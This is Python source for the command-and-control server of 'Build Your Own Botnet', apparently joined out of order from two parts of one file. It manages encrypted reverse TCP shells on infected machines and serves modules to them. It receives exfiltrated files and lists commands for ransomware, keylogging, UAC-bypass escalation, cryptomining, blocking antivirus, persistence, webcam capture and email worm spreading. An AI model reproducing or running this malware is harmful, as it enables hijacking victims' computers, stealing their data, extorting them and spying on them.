                        util.display("New Connection:", color='white', style='bright', end=' ')
                    else:
                        util.display("\n\n[+]", color='green', style='bright', end=' ')
                        util.display("Connection:", color='white', style='bright', end=' ')
                    util.display(address[0], color='white', style='normal')
                    util.display("    Session:", color='white', style='bright', end=' ')
                    util.display(str(session.id), color='white', style='normal')
                    util.display("    Started:", color='white', style='bright', end=' ')
                    util.display(time.ctime(session._created), color='white', style='normal')
                    session.info = info
                    self.sessions[int(session.id)] = session
            else:
                util.display("\n\n[-]", color='red', style='bright', end=' ')
                util.display("Failed Connection:", color='white', style='bright', end=' ')
                util.display(address[0], color='white', style='normal')

            # refresh prompt
            prompt = '\n{}'.format(self.current_session._prompt if self.current_session else self._prompt)
            util.display(prompt, color=self._prompt_color, style=self._prompt_style, end=' ')
            sys.stdout.flush()

            abort = globals()['__abort']
            if abort:
                break

    @util.threaded
    def serve_resources(self):
        """
        Handles serving modules and packages in a seperate thread

        """
        host, port = self.socket.getsockname()
        while True:
            time.sleep(3)
            globals()['package_handler'].terminate()
            globals()['package_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=globals()['packages'], shell=True)

    def run(self):
        """
        Run C2 server administration terminal

        """
        if globals()['debug']:
            util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
        self._active.set()
        if 'c2' not in globals()['__threads']:
            globals()['__threads']['c2'] = self.serve_until_stopped()
        while True:
            try:
                self._active.wait()
                self._prompt = "[{} @ %s]> ".format(os.getenv('USERNAME', os.getenv('USER', 'byob'))) % os.getcwd()
                cmd_buffer = self._get_prompt(self._prompt)
                if cmd_buffer:
                    output = ''
                    cmd, _, action = cmd_buffer.partition(' ')
                    if cmd in self.commands:
                        method = self.commands[cmd]['method']
                        if callable(method):
                            try:
                                output = method(action) if len(action) else method()
                            except Exception as e1:
                                output = str(e1)
                        else:
                            util.display("\n[-]", color='red', style='bright', end=' ')
                            util.display("Error:", color='white', style='bright', end=' ')
                            util.display(method + "\n", color='white', style='normal')
                    elif cmd == 'cd':
                        try:
                            os.chdir(action)
                        except: pass
                    else:
                        try:
                            output = str().join((subprocess.Popen(cmd_buffer, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate()))
                        except: pass
                    if output:
                        util.display(str(output))
                if globals()['__abort']:
                    break
            except KeyboardInterrupt:
                self._active.clear()
                break
        self.quit()


class Session(threading.Thread):
    """
    A subclass of threading.Thread that is designed to handle an
    incoming connection by creating an new authenticated session
    for the encrypted connection of the reverse TCP shell

    """

    def __init__(self, connection=None, id=0):
        """
        Create a new Session

        `Requires`
        :param connection:  socket.socket object

        `Optional`
        :param int id:      session ID

        """
        super(Session, self).__init__()
        self._prompt = None
        self._abort = False
        self._lock = threading.Lock()
        self._active = threading.Event()
        self._created = time.time()
        self.id = id
        self.connection = connection
        self.key = security.diffiehellman(self.connection)
        self.rsa = None  # security.Crypto.PublicKey.RSA.generate(2048)
        try:
            self.info = self.client_info()
            #self.info['id'] = self.id
        except Exception as e:
            print("Session init exception: " + str(e))
            self.info = None

    def kill(self):
        """
        Kill the reverse TCP shell session

        """
        self._active.clear()
        globals()['c2'].session_remove(self.id)
        globals()['c2'].current_session = None
        globals()['c2']._active.set()
        globals()['c2'].run()

    def client_info(self):
        """
        Get information about the client host machine
        to identify the session

        """
        header_size = struct.calcsize("!L")
        header = self.connection.recv(header_size)
        msg_size = struct.unpack("!L", header)[0]
        msg = self.connection.recv(msg_size)
        data = security.decrypt_aes(msg, self.key)
        info = json.loads(data)
        for key, val in info.items():
            if str(val).startswith("_b64"):
                info[key] = base64.b64decode(str(val[6:])).decode('ascii')
        return info

    def status(self):
        """
        Check the status and duration of the session

        """
        c = time.time() - float(self._created)
        data = ['{} days'.format(int(c / 86400.0)) if int(c / 86400.0) else str(),
                '{} hours'.format(int((c % 86400.0) / 3600.0)) if int((c % 86400.0) / 3600.0) else str(),
                '{} minutes'.format(int((c % 3600.0) / 60.0)) if int((c % 3600.0) / 60.0) else str(),
                '{} seconds'.format(int(c % 60.0)) if int(c % 60.0) else str()]
        return ', '.join([i for i in data if i])

    def send_task(self, task):
        """
        Send task results to the server

        `Requires`
        :param dict task:
          :attr str uid:             task ID assigned by server
          :attr str task:            task assigned by server
          :attr str result:          task result completed by client
          :attr str session:         session ID assigned by server
          :attr datetime issued:     time task was issued by server
          :attr datetime completed:  time task was completed by client

        Returns True if succesfully sent task to server, otherwise False

        """
        if not isinstance(task, dict):
            raise TypeError('task must be a dictionary object')
        if not 'session' in task:
            task['session'] = self.info.get('uid')
        data = security.encrypt_aes(json.dumps(task), self.key)
        msg  = struct.pack('!L', len(data)) + data
        self.connection.sendall(msg)
        return True

    def recv_task(self):
        """
        Receive and decrypt incoming task from server

        :returns dict task:
          :attr str uid:             task ID assigned by server
          :attr str session:         client ID assigned by server
          :attr str task:            task assigned by server
          :attr str result:          task result completed by client
          :attr datetime issued:     time task was issued by server
          :attr datetime completed:  time task was completed by client

        """

        header_size = struct.calcsize('!L')
        header = self.connection.recv(header_size)
        if len(header) == 4:
            msg_size = struct.unpack('!L', header)[0]
            msg = self.connection.recv(msg_size)
            data = security.decrypt_aes(msg, self.key)
            return json.loads(data)
        else:
            # empty header; peer down, scan or recon. Drop.
            return 0

    def run(self):
        """
        Handle the server-side of the session's reverse TCP shell

        """
        while True:
            if self._active.wait():
                task = self.recv_task() if not self._prompt else self._prompt
                if isinstance(task, dict):
                    if 'help' in task.get('task'):
                        self._active.clear()
                        globals()['c2'].help(task.get('result'))
                        self._active.set()
                    elif 'prompt' in task.get('task'):
                        self._prompt = task
                        command = globals()['c2']._get_prompt(task.get('result') % int(self.id))
                        cmd, _, action  = command.partition(' ')
                        if cmd in ('\n', ' ', ''):
                            continue
                        elif cmd in globals()['c2'].commands and callable(globals()['c2'].commands[cmd]['method']):
                            method = globals()['c2'].commands[cmd]['method']
                            if callable(method):
                                result = method(action) if len(action) else method()
                                if result:
                                    task = {'task': cmd, 'result': result, 'session': self.info.get('uid')}
                                    globals()['c2'].display(result.encode())
                                    globals()['c2'].database.handle_task(task)
                                continue
                        else:
                            task = globals()['c2'].database.handle_task({'task': command, 'session': self.info.get('uid')})
                            self.send_task(task)
                    elif 'result' in task:
                        if task.get('result') and task.get('result') != 'None':
                            globals()['c2'].display(task.get('result').encode())
                            globals()['c2'].database.handle_task(task)
                else:
                    if self._abort:
                        break
                    elif isinstance(task, int) and task == 0:
                        break
                self._prompt = None

        time.sleep(1)
        globals()['c2'].session_remove(self.id)
        self._active.clear()
        globals()['c2']._return()
        
#!/usr/bin/python
# -*- coding: utf-8 -*-
'Command & Control (Build Your Own Botnet)'
from __future__ import print_function

# standard library
import os
import sys
import time
import json
import base64
import pickle
import socket
import struct
import random
import inspect
import argparse
import datetime
import threading
import subprocess
import collections

http_serv_mod = "SimpleHTTPServer"
if sys.version_info[0] > 2:
    http_serv_mod = "http.server"
    sys.path.append('core')
    sys.path.append('modules')

# modules
import core.util as util
import core.database as database
import core.security as security

# packages
try:
    import cv2
except ImportError:
    util.log("Warning: missing package 'cv2' is required for 'webcam' module")
try:
    import colorama
except ImportError:
    sys.exit("Error: missing package 'colorama' is required")

try:
    raw_input          # Python 2
except NameError:
    raw_input = input  # Python 3

# globals
__threads = {}
__abort = False
__debug = False
__banner__ = """

88                                  88
88                                  88
88                                  88
88,dPPYba,  8b       d8  ,adPPYba,  88,dPPYba,
88P'    "8a `8b     d8' a8"     "8a 88P'    "8a
88       d8  `8b   d8'  8b       d8 88       d8
88b,   ,a8"   `8b,d8'   "8a,   ,a8" 88b,   ,a8"
8Y"Ybbd8"'      Y88'     `"YbbdP"'  8Y"Ybbd8"'
                d8'
               d8'

"""

# main
def main():

    parser = argparse.ArgumentParser(
        prog='server.py',
        description="Command & Control Server (Build Your Own Botnet)"
    )

    parser.add_argument(
        '--host',
        action='store',
        type=str,
        default='0.0.0.0',
        help='server hostname or IP address')

    parser.add_argument(
        '--port',
        action='store',
        type=int,
        default=1337,
        help='server port number')

    parser.add_argument(
        '--database',
        action='store',
        type=str,
        default='database.db',
        help='SQLite database')

    parser.add_argument(
        '--debug',
        action='store_true',
        help='Additional logging'
    )

    parser.add_argument(
        '-v', '--version',
        action='version',
        version='0.5',
    )

    modules = os.path.abspath('modules')
    site_packages = [os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if os.path.basename(_) == 'site-packages'] if len([os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if os.path.basename(_) == 'site-packages']) else [os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if 'local' not in _ if os.path.basename(_) == 'dist-packages']

    if len(site_packages):
        n = 0
        globals()['packages'] = site_packages[0]
        for path in site_packages:
            if n < len(os.listdir(path)):
                n = len(os.listdir(path))
                globals()['packages'] = path
    else:
        util.log("unable to locate 'site-packages' in sys.path (directory containing user-installed packages/modules)")
        sys.exit(0)

    if not os.path.isdir('data'):
        try:
            os.mkdir('data')
        except OSError:
            util.log("Unable to create directory 'data' (permission denied)")

    options = parser.parse_args()
    tmp_file=open("temp","w")
    
    globals()['debug'] = options.debug

    # host Python packages on C2 port + 2 (for clients to remotely import)
    globals()['package_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, options.port + 2), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=globals()['packages'], shell=True)

    # host BYOB modules on C2 port + 1 (for clients to remotely import)
    globals()['module_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, options.port + 1), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=modules, shell=True)

    # run simple HTTP POST request handler on C2 port + 3 to handle incoming uploads of exfiltrated files
    globals()['post_handler'] = subprocess.Popen('{} core/handler.py {}'.format(sys.executable, int(options.port + 3)), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, shell=True)

    # run C2
    globals()['c2'] = C2(host=options.host, port=options.port, db=options.database)
    globals()['c2'].run()


class C2():
    """
    Console-based command & control server with a streamlined user-interface for controlling clients
    with reverse TCP shells which provide direct terminal access to the client host machines, as well
    as handling session authentication & management, serving up any scripts/modules/packages requested
    by clients to remotely import them, issuing tasks assigned by the user to any/all clients, handling
    incoming completed tasks from clients

    """

    _lock = threading.Lock()
    _text_color = 'WHITE'
    _text_style = 'NORMAL'
    _prompt_color = 'WHITE'
    _prompt_style = 'BRIGHT'

    def __init__(self, host='0.0.0.0', port=1337, db=':memory:'):
        """
        Create a new Command & Control server

        `Optional`
        :param str db:      SQLite database
                                :memory: (session)
                                *.db     (persistent)

        Returns a byob.server.C2 instance

        """
        self._active = threading.Event()
        self._count = 0
        self._prompt = None
        self._database = db
        self.child_procs = {}
        self.current_session = None
        self.sessions = {}
        self.socket = self._socket(port)
        self.banner = self._banner()
        self.commands = {
            'set' : {
                'method': self.set,
                'usage': 'set <setting> [option=value]',
                'description': 'change the value of a setting'},
            'help' : {
                'method': self.help,
                'usage': 'help',
                'description': 'show usage help for server commands'},
            'exit' : {
                'method': self.quit,
                'usage': 'exit',
                'description': 'quit the server'},
            'debug' : {
                'method': self.debug,
                'usage': 'debug <code>',
                'description': 'run python code directly on server (debugging MUST be enabled)'},
            'query' : {
                'method': self.query,
                'usage': 'query <statement>',
                'description': 'query the SQLite database'},
            'options' : {
                'method': self.settings,
                'usage': 'options',
                'description': 'show currently configured settings'},
            'sessions' : {
                'method': self.session_list,
                'usage': 'sessions',
                'description': 'show active client sessions'},
            'clients' : {
                'method': self.client_list,
                'usage': 'clients',
                'description': 'show all clients that have joined the server'},
            'shell' : {
                'method': self.session_shell,
                'usage': 'shell <id>',
                'description': 'interact with a client with a reverse TCP shell through an active session'},
            'ransom' : {
                'method': self.session_ransom,
                'usage': 'ransom [id]',
                'description': 'encrypt client files & ransom encryption key for a Bitcoin payment'},
            'webcam' : {
                'method': self.session_webcam,
                'usage': 'webcam <mode>',
                'description': 'capture image/video from the webcam of a client device'},
            'kill' : {
                'method': self.session_remove,
                'usage': 'kill <id>',
                'description': 'end a session'},
            'bg' : {
                'method': self.session_background,
                'usage': 'bg [id]',
                'description': 'background a session (default: the current session)'},
            'broadcast' : {
                'method': self.task_broadcast,
                'usage': 'broadcast <command>',
                'description': 'broadcast a task to all active sessions'},
            'results': {
                'method': self.task_list,
                'usage': 'results [id]',
                'description': 'display all completed task results for a client (default: all clients)'},
            'tasks' : {
                'method': self.task_list,
                'usage': 'tasks [id]',
                'description': 'display all incomplete tasks for a client (default: all clients)'},
            'abort': {
                'method': 'you must first connect to a session to use this command',
                'description': 'abort execution and self-destruct',
                'usage': 'abort'},
            'cat': {
                'method': 'you must first connect to a session to use this command',
                'description': 'display file contents', 
                'usage': 'cat <path>'},
            'cd': {
                'method': 'you must first connect to a session to use this command',
                'description': 'change current working directory',
                'usage': 'cd <path>'},
            'escalate': {
                'method': 'you must first connect to a session to use this command',
                'description': 'attempt uac bypass to escalate privileges',
                'usage': 'escalate'},
            'eval': {
                'method': 'you must first connect to a session to use this command',
                'description': 'execute python code in current context',
                'usage': 'eval <code>'},
            'execute': {
                'method': 'you must first connect to a session to use this command',
                'description': 'run an executable program in a hidden process',
                'usage': 'execute <path> [args]'},
            'help': {
                'method': self.help,
                'description': 'show usage help for commands and modules',
                'usage': 'help [cmd]'},
            'icloud': {
                'method': 'you must first connect to a session to use this command',
                'description': 'check for logged in icloud account on macos',
                'usage': 'icloud'},
            'keylogger': {
                'method': 'you must first connect to a session to use this command',
                'description': 'log user keystrokes',
                'usage': 'keylogger [mode]'},
            'load': {
                'method': 'you must first connect to a session to use this command',
                'description': 'remotely import a module or package',
                'usage': 'load <module> [target]'},
            'ls': {
                'method': 'you must first connect to a session to use this command',
                'description': 'list the contents of a directory',
                'usage': 'ls <path>'},
            'miner': {
                'method': 'you must first connect to a session to use this command',
                'description': 'run cryptocurrency miner in the background',
                'usage': 'miner <url> <user> <pass>'},
            'outlook': {
                'method': 'you must first connect to a session to use this command',
                'description': 'access outlook email in the background',
                'usage': 'outlook <option> [mode]'},
            'packetsniffer': {
                'method': 'you must first connect to a session to use this command',
                'description': 'capture traffic on local network',
                'usage': 'packetsniffer [mode]'},
            'passive': {
                'method': 'you must first connect to a session to use this command',
                'description': 'keep client alive while waiting to re-connect',
                'usage': 'passive'},
            'persistence': {
                'method': 'you must first connect to a session to use this command',
                'description': 'establish persistence on client host machine',
                'usage': 'persistence <add/remove> [method]'},
            'portscanner': {
                'method': 'you must first connect to a session to use this command',
                'description': 'scan a target host or network to identify',
                'usage': 'portscanner <target>'},
            'process': {
                'method': 'you must first connect to a session to use this command',
                'description': 'block process (e.g. antivirus) or monitor process',
                'usage': 'process <block/monitor>'},
            'pwd': {
                'method': 'you must first connect to a session to use this command',
                'description': 'show name of present working directory',
                'usage': 'pwd'},
            'restart': {
                'method': 'you must first connect to a session to use this command',
                'description': 'restart the shell', 
                'usage': 'restart [output]'},
            'screenshot': {
                'method': 'you must first connect to a session to use this command',
                'description': 'capture a screenshot from host device',
                'usage': 'screenshot'},
            'show': {
                'method': 'you must first connect to a session to use this command',
                'description': 'show value of an attribute',
                'usage': 'show <value>'},
            'spread': {
                'method': 'you must first connect to a session to use this command',
                'description': 'activate worm-like behavior and begin spreading client via email',
                'usage': 'spread <gmail> <password> <URL email list>'},
            'stop': {
                'method': 'you must first connect to a session to use this command',
                'description': 'stop a running job', 
                'usage': 'stop <job>'},
            'upload': {
                'method': 'you must first connect to a session to use this command',
                'description': 'upload file from client machine to the c2 server',
                'usage': 'upload [file]'},
            'wget': {
                'method': 'you must first connect to a session to use this command',
                'description': 'download file from url', 
                'usage': 'wget <url>'}        
        }

        try:
            import readline
        except ImportError:
            util.log("Warning: missing package 'readline' is required for tab-completion")
        else:
            import rlcompleter
            readline.parse_and_bind("tab: complete")
            readline.set_completer(self._completer)

    def _print(self, info):
        lock = self.current_session._lock if self.current_session else self._lock
        if isinstance(info, str):
            try:
                info = json.loads(info)
            except: pass
        if isinstance(info, dict):
            max_key = int(max(map(len, [str(i1) for i1 in info.keys() if i1 if i1 != 'None'])) + 2) if int(max(map(len, [str(i1) for i1 in info.keys() if i1 if i1 != 'None'])) + 2) < 80 else 80
            max_val = int(max(map(len, [str(i2) for i2 in info.values() if i2 if i2 != 'None'])) + 2) if int(max(map(len, [str(i2) for i2 in info.values() if i2 if i2 != 'None'])) + 2) < 80 else 80
            key_len = {len(str(i2)): str(i2) for i2 in info.keys() if i2 if i2 != 'None'}
            keys = {k: key_len[k] for k in sorted(key_len.keys())}
            with lock:
                for key in keys.values():
                    if info.get(key) and info.get(key) != 'None':
                        try:
                            info[key] = json.loads(key)
                            self._print(info[key])
                        except:
                            if len(str(info.get(key))) > 80:
                                info[key] = str(info.get(key))[:77] + '...'
                            info[key] = str(info.get(key)).replace('\n',' ') if not isinstance(info.get(key), datetime.datetime) else str(key).encode().replace("'", '"').replace('True','true').replace('False','false') if not isinstance(key, datetime.datetime) else str(int(time.mktime(key.timetuple())))
                            util.display('\x20' * 4, end=' ')
                            util.display(key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2), color=self._text_color, style=self._text_style)
        else:
            with lock:
                util.display('\x20' * 4, end=' ')
                util.display(str(info), color=self._text_color, style=self._text_style)

    def _socket(self, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', port))
        s.listen(100)
        return s

    def _return(self, data=None):
        lock, prompt = (self.current_session._lock, self.current_session._prompt) if self.current_session else (self._lock, self._prompt)
        with lock:
            if data:
                util.display('\n{}\n'.format(data))
            util.display(prompt, end=' ')

    def _banner(self):
        with self._lock:
            util.display(__banner__, color=random.choice(['red','green','cyan','magenta','yellow']), style='bright')
            util.display("[?] ", color='yellow', style='bright', end=' ')
            util.display("Hint: show usage information with the 'help' command\n", color='white', style='normal')
        return __banner__

    def _get_arguments(self, data):
        args = tuple([i.strip('-') for i in str(data).split() if '=' not in i])
        kwds = dict({i.partition('=')[0].strip('-'): i.partition('=')[2].strip('-') for i in str(data).split() if '=' in i})
        return collections.namedtuple('Arguments', ('args','kwargs'))(args, kwds)

    def _get_session_by_id(self, session):
        session = None
        if str(session).isdigit() and int(session) in self.sessions:
            session = self.sessions[int(session)]
        elif self.current_session:
            session = self.current_session
        else:
            util.log("Invalid Client ID")
        return session

    def _get_session_by_connection(self, connection):
        session = None
        if isinstance(connection, socket.socket):
            peer = connection.getpeername()[0]
            for s in self.get_sessions():
                if s.connection.getpeername()[0] == peer:
                    session = s
                    break
            else:
                util.log("Session not found for: {}".format(peer))
        else:
            util.log("Invalid input type (expected '{}', received '{}')".format(socket.socket, type(connection)))
        return session

    def _completer(self, text, state):
        options = [i for i in self.commands.keys() if i.startswith(text)]
        if state < len(options):
            return options[state]
        return None

    def _get_prompt(self, data):
        with self._lock:
            return raw_input(getattr(colorama.Fore, self._prompt_color) + getattr(colorama.Style, self._prompt_style) + data.rstrip())

    def _execute(self, args):
        # ugly method that should be refactored at some point
        path, args = [i.strip() for i in args.split('"') if i if not i.isspace()] if args.count('"') == 2 else [i for i in args.partition(' ') if i if not i.isspace()]
        args = [path] + args.split()
        if os.path.isfile(path):
            name = os.path.splitext(os.path.basename(path))[0]
            try:
                info = subprocess.STARTUPINFO()
                info.dwFlags = subprocess.STARTF_USESHOWWINDOW ,  subprocess.CREATE_NEW_ps_GROUP
                info.wShowWindow = subprocess.SW_HIDE
                self.child_procs[name] = subprocess.Popen(args, startupinfo=info)
                return "Running '{}' in a hidden process".format(path)
            except Exception as e:
                try:
                    self.child_procs[name] = subprocess.Popen(args, 0, None, None, subprocess.PIPE, subprocess.PIPE)
                    return "Running '{}' in a new process".format(name)
                except Exception as e:
                    util.log("{} error: {}".format(self.execute.__name__, str(e)))
        else:
            return "File '{}' not found".format(str(path))


    def debug(self, code):
        """
        Execute code directly in the context of the currently running process

        `Requires`
        :param str code:    Python code to execute

        """
        if globals()['debug']:
            try:
                print(eval(code))
            except Exception as e:
                util.log("Error: %s" % str(e))
        else:
            util.log("Debugging mode is disabled")

    def quit(self):
        """
        Quit server and optionally keep clients alive

        """

        # terminate handlers running on other ports
        globals()['package_handler'].terminate()
        globals()['module_handler'].terminate()
        globals()['post_handler'].terminate()

        # kill subprocesses (subprocess.Popen)
        for proc in self.child_procs.values():
            try:
                proc.kill()
            except: pass

        # kill child processes (multiprocessing.Process)
        for child_proc in self.child_procs.values():
            try:
                child_proc.terminate()
            except: pass
        
        # kill clients or keep alive (whichever user specifies)
        if self._get_prompt('Quitting server - Keep clients alive? (y/n): ').startswith('y'):
            for session in self.sessions.values():
                if isinstance(session, Session):
                    try:
                        session._active.set()
                        session.send_task({"task": "passive"})
                    except: pass
        globals()['__abort'] = True
        self._active.clear()

        # kill server and exit
        _ = os.popen("taskkill /pid {} /f".format(os.getpid()) if os.name == 'nt' else "kill -9 {}".format(os.getpid())).read()
        util.display('Exiting...')
        sys.exit(0)

    def help(self, cmd=None):
        """
        Show usage information

        `Optional`
        :param str info:   client usage help

        """
        column1 = 'command <arg>'
        column2 = 'description'

        # if a valid command is specified, display detailed help for it.
        # otherwise, display help for all commands
        if cmd:
            if cmd in self.commands:
                info = {self.commands[cmd]['usage']: self.commands[cmd]['description']} 
            else:
                util.display("'{cmd}' is not a valid command. Type 'help' to see all commands.".format(cmd=cmd))
                return
        else:
            info = {command['usage']: command['description'] for command in self.commands.values()}

        max_key = max(map(len, list(info.keys()) + [column1])) + 2
        max_val = max(map(len, list(info.values()) + [column2])) + 2
        util.display('\n', end=' ')
        util.display(column1.center(max_key) + column2.center(max_val), color=self._text_color, style='bright')
        for key in sorted(info):
            util.display(key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2), color=self._text_color, style=self._text_style)
        util.display("\n", end=' ')


    def display(self, info):
        """
        Display formatted output in the console

        `Required`
        :param str info:   text to display

        """
        with self._lock:
            print()
            if isinstance(info, dict):
                if len(info):
                    self._print(info)
            elif isinstance(info, list):
                if len(info):
                    for data in info:
                        util.display('  %d\n' % int(info.index(data) + 1), color=self._text_color, style='bright', end="")
                        self._print(data)
            elif isinstance(info, str):
                try:
                    self._print(json.loads(info))
                except:
                    util.display(str(info), color=self._text_color, style=self._text_style)
            elif isinstance(info, bytes):
                try:
                    self._print(json.load(info))
                except:
                    util.display(info.decode('utf-8'), color=self._text_color, style=self._text_style)
            else:
                util.log("{} error: invalid data type '{}'".format(self.display.__name__, type(info)))
            print()

    def query(self, statement):
        """
        Query the database

        `Requires`
        :param str statement:    SQL statement to execute

        """
        self.database.execute_query(statement, returns=False, display=True)

    def settings(self):
        """
        Show the server's currently configured settings

        """
        text_color = [color for color in filter(str.isupper, dir(colorama.Fore)) if color == self._text_color][0]
        text_style = [style for style in filter(str.isupper, dir(colorama.Style)) if style == self._text_style][0]
        prompt_color = [color for color in filter(str.isupper, dir(colorama.Fore)) if color == self._prompt_color][0]
        prompt_style = [style for style in filter(str.isupper, dir(colorama.Style)) if style == self._prompt_style][0]
        util.display('\n\t    OPTIONS', color='white', style='bright')
        util.display('text color/style: ', color='white', style='normal', end=' ')
        util.display('/'.join((self._text_color.title(), self._text_style.title())), color=self._text_color, style=self._text_style)
        util.display('prompt color/style: ', color='white', style='normal', end=' ')
        util.display('/'.join((self._prompt_color.title(), self._prompt_style.title())), color=self._prompt_color, style=self._prompt_style)
        util.display('debug: ', color='white', style='normal', end=' ')
        util.display('True\n' if globals()['debug'] else 'False\n', color='green' if globals()['debug'] else 'red', style='normal')

    def set(self, args=None):
        """
        Set display settings for the command & control console

        Usage: `set [setting] [option]=[value]`

            :setting text:      text displayed in console
            :setting prompt:    prompt displayed in shells

            :option color:      color attribute of a setting
            :option style:      style attribute of a setting

            :values color:      red, green, cyan, yellow, magenta
            :values style:      normal, bright, dim

        Example 1:         `set text color=green style=normal`
        Example 2:         `set prompt color=white style=bright`

        """
        if args:
            arguments = self._get_arguments(args)
            args, kwargs = arguments.args, arguments.kwargs
            if arguments.args:
                target = args[0]
                args = args[1:]
                if target in ('debug','debugging'):
                    if args:
                        setting = args[0]
                        if setting.lower() in ('0','off','false','disable'):
                            globals()['debug'] = False
                        elif setting.lower() in ('1','on','true','enable'):
                            globals()['debug'] = True
                        util.display("\n[+]" if globals()['debug'] else "\n[-]", color='green' if globals()['debug'] else 'red', style='normal', end=' ')
                        util.display("Debug: {}\n".format("ON" if globals()['debug'] else "OFF"), color='white', style='bright')
                        return
                for setting, option in arguments.kwargs.items():
                    option = option.upper()
                    if target == 'prompt':
                        if setting == 'color':
                            if hasattr(colorama.Fore, option):
                                self._prompt_color = option
                        elif setting == 'style':
                            if hasattr(colorama.Style, option):
                                self._prompt_style = option
                        util.display("\nprompt color/style changed to ", color='white', style='bright', end=' ')
                        util.display(option + '\n', color=self._prompt_color, style=self._prompt_style)
                        return
                    elif target == 'text':
                        if setting == 'color':
                            if hasattr(colorama.Fore, option):
                                self._text_color = option
                        elif setting == 'style':
                            if hasattr(colorama.Style, option):
                                self._text_style = option
                        util.display("\ntext color/style changed to ", color='white', style='bright', end=' ')
                        util.display(option + '\n', color=self._text_color, style=self._text_style)
                        return
        util.display("\nusage: set [setting] [option]=[value]\n\n    colors:   white/black/red/yellow/green/cyan/magenta\n    styles:   dim/normal/bright\n", color=self._text_color, style=self._text_style)

    def task_list(self, id=None):
        """
        List client tasks and results

        `Requires`
        :param int id:   session ID

        """
        if globals()['debug']:
            util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
        lock = self.current_session._lock if self.current_session else self._lock
        tasks = self.database.get_tasks()
        with lock:
            print()
            for task in tasks:
                util.display(tasks.index(task) + 1)
                self.database._display(task)
            print()

    def task_broadcast(self, command):
        """
        Broadcast a task to all sessions

        `Requires`
        :param str command:   command to broadcast

        """
        if globals()['debug']:
            util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
        sessions = self.sessions.values()
        send_tasks = [session.send_task({"task": command}) for session in sessions]
        recv_tasks = {session: session.recv_task() for session in sessions}
        for session, task in recv_tasks.items():
            if isinstance(task, dict) and task.get('task') == 'prompt' and task.get('result'):
                session._prompt = task.get('result')
            elif task.get('result'):
                self.display(task.get('result'))
        self._return()

    def session_webcam(self, args=''):
        """
        Interact with a client webcam

        `Optional`
        :param str args:   stream [port], image, video

        """
        if not self.current_session:
            util.log( "No client selected")
            return
        client = self.current_session
        result = ''
        mode, _, arg = args.partition(' ')
        client._active.clear()
        if not mode or str(mode).lower() == 'stream':
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            retries = 5
            while retries > 0:
                try:
                    port = random.randint(6000,9999)
                    s.bind(('0.0.0.0', port))
                    s.listen(1)
                    cmd = {"task": 'webcam stream {}'.format(port)}
                    client.send_task(cmd)
                    conn, addr = s.accept()
                    break
                except:
                    retries -= 1
            header_size = struct.calcsize("L")
            window_name = addr[0]
            cv2.namedWindow(window_name)
            data = ""
            try:
                while True:
                    while len(data) < header_size:
                        data += conn.recv(4096)
                    packed_msg_size = data[:header_size]
                    data = data[header_size:]
                    msg_size = struct.unpack(">L", packed_msg_size)[0]
                    while len(data) < msg_size:
                        data += conn.recv(4096)
                    frame_data = data[:msg_size]
                    data = data[msg_size:]
                    frame = pickle.loads(frame_data)
                    cv2.imshow(window_name, frame)
                    key = cv2.waitKey(70)
                    if key == 32:
                        break
            finally:
                conn.close()
                cv2.destroyAllWindows()
                result = 'Webcam stream ended'
        else:
            client.send_task({"task": "webcam %s" % args})
            task = client.recv_task()
            result = task.get('result')
            client._active.set()
        return result

    def session_remove(self, session_id):
        """
        Shutdown client shell and remove client from database

        `Requires`
        :param int session_id:   session ID

        """
        if globals()['debug']:
            util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
        if not str(session_id).isdigit() or int(session_id) not in self.sessions:
            return
        elif str(session_id).isdigit() and int(session_id) in self.sessions and not isinstance(self.sessions[int(session_id)], Session):
            session = self.sessions[int(session_id)]
            util.display("Session '{}' is stale (Awaiting Connection)".format(session_id))
            _ = self.sessions.pop(int(session_id), None)
            self.database.update_status(session['info']['uid'], 0)
            with self._lock:
                util.display('Session {} expunged'.format(session_id))
            self._active.set()
            return self.run()
        else:
            # select session
            session = self.sessions[int(session_id)]
            session._active.clear()
            # send kill command to client
            try:
                session.send_task({"task": "kill", "session": session.info.get('uid')})
                # shutdown the connection
                session.connection.shutdown(socket.SHUT_RDWR)
                session.connection.close()
                # update current sessions
            except: pass
            _ = self.sessions.pop(int(session_id), None)
            # update persistent database
            self.database.update_status(session.info.get('uid'), 0)
            if self.current_session != None and int(session_id) != self.current_session.id:
                with self.current_session._lock:
                    util.display('Session {} disconnected'.format(session_id))
                self._active.clear()
                self.current_session._active.set()
                return self.current_session.run()
            else:
                self.current_session = None
                with self._lock:
                    util.display('Session {} disconnected'.format(session_id))
                self._active.set()
                session._active.clear()
                return self.run()

    def client_list(self, verbose=True):
        """
        List currently online clients

        `Optional`
        :param str verbose:   verbose output (default: False)

        """
        if globals()['debug']:
            util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
        lock = self.current_session._lock if self.current_session else self._lock
        with lock:
            print()
            sessions = self.database.get_sessions(verbose=verbose)
            self.database._display(sessions)
            print()

    def session_list(self):
        """
        List active sessions

        """
        if globals()['debug']:
            util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
